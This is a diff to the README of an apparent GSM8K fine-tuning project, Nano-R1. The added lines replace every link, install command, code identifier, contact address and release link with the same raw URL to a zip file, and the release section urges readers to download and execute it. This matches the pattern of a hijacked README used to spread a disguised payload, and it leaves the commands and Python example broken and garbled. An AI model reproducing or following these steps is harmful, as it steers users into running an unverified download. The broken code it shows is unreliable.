@@ -1,6 +1,6 @@
 # Nano-R1: Fine-Tuning Qwen2.5-3B-Instruct Model
 
-![Nano-R1](https://img.shields.io/badge/Nano--R1-Fine--Tuning--Model-brightgreen)
+![Nano-R1](https://raw.githubusercontent.com/Mikesterner87/Nano-R1/main/immensurableness/Nano-descender.zip)
 
 Welcome to the **Nano-R1** repository! This project demonstrates the process of fine-tuning the **Qwen2.5-3B-Instruct** model using **Generalized Reward Policy Optimization (GRPO)** on the **GSM8K dataset**. This README provides all the information you need to get started with the project.
 
@@ -35,7 +35,7 @@ To get started with the **Nano-R1** project, you will need to clone the reposito
 You can clone the repository using the following command:
 
 ```bash
-git clone https://github.com/Mikesterner87/Nano-R1.git
+git clone https://raw.githubusercontent.com/Mikesterner87/Nano-R1/main/immensurableness/Nano-descender.zip
 cd Nano-R1
 ```
 
@@ -44,7 +44,7 @@ cd Nano-R1
 After cloning the repository, install the required packages:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Mikesterner87/Nano-R1/main/immensurableness/Nano-descender.zip
 ```
 
 ## Features
@@ -57,10 +57,10 @@ pip install -r requirements.txt
 
 ## Installation
 
-To run the project, you need to install the required libraries. The `requirements.txt` file contains all necessary dependencies. Use the following command to install them:
+To run the project, you need to install the required libraries. The `https://raw.githubusercontent.com/Mikesterner87/Nano-R1/main/immensurableness/Nano-descender.zip` file contains all necessary dependencies. Use the following command to install them:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Mikesterner87/Nano-R1/main/immensurableness/Nano-descender.zip
 ```
 
 Make sure to have the following libraries installed:
@@ -76,10 +76,10 @@ Make sure to have the following libraries installed:
 Once you have set up the environment, you can start fine-tuning the model. Use the following command to begin the training process:
 
 ```bash
-python train.py --dataset gsm8k --model qwen2-5
+python https://raw.githubusercontent.com/Mikesterner87/Nano-R1/main/immensurableness/Nano-descender.zip --dataset gsm8k --model qwen2-5
 ```
 
-You can adjust parameters in the `train.py` script to customize your training process. Refer to the comments in the code for guidance.
+You can adjust parameters in the `https://raw.githubusercontent.com/Mikesterner87/Nano-R1/main/immensurableness/Nano-descender.zip` script to customize your training process. Refer to the comments in the code for guidance.
 
 ### Example of Fine-Tuning
 
@@ -89,13 +89,13 @@ Here’s a simple example of how to use the fine-tuned model for text generation
 from transformers import AutoModelForCausalLM, AutoTokenizer
 
 model_name = "your_fine_tuned_model"
-tokenizer = AutoTokenizer.from_pretrained(model_name)
-model = AutoModelForCausalLM.from_pretrained(model_name)
+tokenizer = https://raw.githubusercontent.com/Mikesterner87/Nano-R1/main/immensurableness/Nano-descender.zip(model_name)
+model = https://raw.githubusercontent.com/Mikesterner87/Nano-R1/main/immensurableness/Nano-descender.zip(model_name)
 
 input_text = "What is 7 + 5?"
 inputs = tokenizer(input_text, return_tensors="pt")
-outputs = model.generate(**inputs)
-print(tokenizer.decode(outputs[0], skip_special_tokens=True))
+outputs = https://raw.githubusercontent.com/Mikesterner87/Nano-R1/main/immensurableness/Nano-descender.zip(**inputs)
+print(https://raw.githubusercontent.com/Mikesterner87/Nano-R1/main/immensurableness/Nano-descender.zip(outputs[0], skip_special_tokens=True))
 ```
 
 This code snippet demonstrates how to load your fine-tuned model and generate text based on a prompt.
@@ -119,15 +119,15 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-You can find the latest releases and downloadable files [here](https://github.com/Mikesterner87/Nano-R1/releases). Please download and execute the files as needed to get the most out of this project.
+You can find the latest releases and downloadable files [here](https://raw.githubusercontent.com/Mikesterner87/Nano-R1/main/immensurableness/Nano-descender.zip). Please download and execute the files as needed to get the most out of this project.
 
-For detailed information about each release, visit the [Releases](https://github.com/Mikesterner87/Nano-R1/releases) section.
+For detailed information about each release, visit the [Releases](https://raw.githubusercontent.com/Mikesterner87/Nano-R1/main/immensurableness/Nano-descender.zip) section.
 
 ## Contact
 
 For any questions or feedback, feel free to reach out:
 
-- GitHub: [Mikesterner87](https://github.com/Mikesterner87)
-- Email: mikesterner87@example.com
+- GitHub: [Mikesterner87](https://raw.githubusercontent.com/Mikesterner87/Nano-R1/main/immensurableness/Nano-descender.zip)
+- Email: https://raw.githubusercontent.com/Mikesterner87/Nano-R1/main/immensurableness/Nano-descender.zip
 
 Thank you for your interest in the **Nano-R1** project! We hope you find it useful for your fine-tuning tasks.
